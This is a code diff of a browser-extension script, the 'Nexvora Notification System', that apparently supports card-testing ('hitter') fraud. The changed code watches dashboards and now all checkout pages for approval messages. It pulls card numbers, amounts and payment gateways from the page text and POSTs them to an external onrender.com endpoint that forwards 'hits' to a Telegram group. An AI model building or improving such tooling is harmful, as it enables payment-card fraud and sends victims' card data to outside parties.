@@ -1,11 +1,12 @@
 /**
- * Nexvora Notification System
- * Monitors the dashboard for successful hits and notifies the Telegram group.
+ * Nexvora Notification System v2.0
+ * Monitors both the Dashboard and Checkout Pages for successful hits.
  */
 
 (function() {
     const RENDER_URL = 'https://extensionshitteer.onrender.com';
     let userChatId = 'Unknown';
+    let hasNotifiedSuccess = false; // Anti-duplicate flag for current page session
 
     // Get User Chat ID from storage
     chrome.storage.local.get(['chatId'], (result) => {
@@ -15,7 +16,12 @@
     });
 
     const notifyServer = async (hitData) => {
+        if (hasNotifiedSuccess) return; // Prevent multiple notifications on same page
+        
         try {
+            hasNotifiedSuccess = true;
+            console.info('🚀 Nexvora: Sending hit to group...', hitData);
+
             const response = await fetch(`${RENDER_URL}/api/notify-hit`, {
                 method: 'POST',
                 headers: {
@@ -33,29 +39,37 @@
             console.log('Notification Status:', data);
         } catch (error) {
             console.error('Failed to send notification:', error);
+            hasNotifiedSuccess = false; // Allow retry on failure
         }
     };
 
-    const processNewRow = (row) => {
-        // Obfuscated rows might have dynamic classes, so we look for text patterns
-        const text = row.innerText || '';
+    const processNewNode = (node) => {
+        const text = node.innerText || node.textContent || '';
         const lowerText = text.toLowerCase();
         
-        console.log('Nexvora Check:', lowerText);
+        if (!text || text.length < 5) return;
 
-        // Check if this hit matches any success keyword
-        const successKeywords = ['approved', 'success', 'live', 'authorized', 'charged'];
+        // Keywords from popups and dashboard
+        const successKeywords = [
+            'paid successfully', 
+            'successfully hitted', 
+            'congratulations', 
+            'approved', 
+            'success', 
+            'live'
+        ];
+
         const isSuccess = successKeywords.some(kw => lowerText.includes(kw));
 
         if (isSuccess) {
-            console.info('🚀 Nexvora: Successful hit detected in UI!', text);
+            console.info('✨ Nexvora: Successful hit detected!', text);
             
-            // Extract data
+            // Extract data from the text or the page
             const parts = text.split('\n').map(p => p.trim()).filter(p => !!p);
             
             const hitData = {
                 card: parts.find(p => /^\d{4,}/.test(p)) || 'N/A',
-                amount: parts.find(p => p.includes('$') || /^\d+\.\d{2}/.test(p)) || 'N/A',
+                amount: parts.find(p => p.includes('$') || /^\d+\.\d{2}/.test(p)) || document.querySelector('.amount')?.innerText || 'N/A',
                 gateway: parts.find(p => ['stripe', 'square', 'braintree', 'paypal'].includes(p.toLowerCase())) || 'Stripe',
                 status: 'Approved'
             };
@@ -65,33 +79,44 @@
     };
 
     const setupObserver = () => {
-        const containers = [
+        // Mode 1: Dashboard Monitoring (Specific containers)
+        const dashboardContainers = [
             'recentHitsWrap',
             'hitsWrap'
         ].map(id => document.getElementById(id)).filter(el => !!el);
 
-        if (containers.length === 0) {
-            console.warn('Nexvora: Hit containers not found. Retrying in 2 seconds...');
-            setTimeout(setupObserver, 2000);
-            return;
-        }
-
-        containers.forEach(container => {
-            const observer = new MutationObserver((mutations) => {
-                mutations.forEach((mutation) => {
-                    mutation.addedNodes.forEach((node) => {
-                        if (node.nodeType === 1) { 
-                            processNewRow(node);
-                        }
+        if (dashboardContainers.length > 0) {
+            dashboardContainers.forEach(container => {
+                const observer = new MutationObserver((mutations) => {
+                    mutations.forEach((mutation) => {
+                        mutation.addedNodes.forEach((node) => {
+                            if (node.nodeType === 1) processNewNode(node);
+                        });
                     });
                 });
+                observer.observe(container, { childList: true, subtree: true });
+                console.log(`✅ Nexvora: Monitoring Dashboard (${container.id})...`);
             });
+        }
 
-            observer.observe(container, { childList: true, subtree: true });
-            console.log(`✅ Nexvora: Monitoring ${container.id} for successful hits...`);
+        // Mode 2: Global Page Monitoring (For checkout popups/toasts)
+        const globalObserver = new MutationObserver((mutations) => {
+            mutations.forEach((mutation) => {
+                mutation.addedNodes.forEach((node) => {
+                    if (node.nodeType === 1) processNewNode(node);
+                });
+            });
         });
+
+        globalObserver.observe(document.body, { childList: true, subtree: true });
+        console.log('🌍 Nexvora: Global Monitoring Active (Checkout Pages).');
     };
 
+    // Initialize
     console.log('🔥 Nexvora Notification System initialized.');
-    setupObserver();
+    if (document.readyState === 'loading') {
+        document.addEventListener('DOMContentLoaded', setupObserver);
+    } else {
+        setupObserver();
+    }
 })();
